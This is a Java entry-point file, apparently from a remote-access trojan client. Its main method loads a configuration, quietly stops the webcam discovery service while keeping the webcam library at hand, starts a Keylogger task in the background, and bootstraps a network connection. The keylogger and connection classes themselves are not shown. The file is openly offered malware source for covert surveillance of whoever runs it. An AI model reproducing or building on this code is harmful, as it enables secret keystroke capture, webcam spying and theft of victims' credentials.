/*
 * Copyright (c) 2021, 7ctx <https://github.com/7ctx/> 
 * Email: <7ctx@mail.com>
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this
 *    list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright notice,
 *    this list of conditions and the following disclaimer in the documentation
 *    and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
 * WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
 * DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR
 * ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
 * (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
 * LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
 * SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */
package com.ctx.client;

import com.github.sarxos.webcam.Webcam;
import com.ctx.client.configuration.JsonConfiguration;
import com.ctx.client.keylogger.Keylogger;
import java.io.IOException;
import lombok.extern.slf4j.Slf4j;

@Slf4j
public class Main 
{
    /**
     * @param args the command line arguments
     */
    public static void main(String[] args) 
    {
        // Disable webcam service until we need it
        Webcam.getDefault().close();
        Webcam.getDiscoveryService().setEnabled(false);
        Webcam.getDiscoveryService().stop();
        
        JsonConfiguration configuration = new JsonConfiguration();
        try 
        {
            configuration.loadConfiguration(configuration.getConfigurationFile().toPath());
        } 
        catch (IOException ex) 
        {
            log.trace(Main.class.getName(), "Failed to load configuration", ex);
        }
        
        Constants.executor.submit(new Keylogger());
        Connection.getInstance().bootstrap();
    }
}
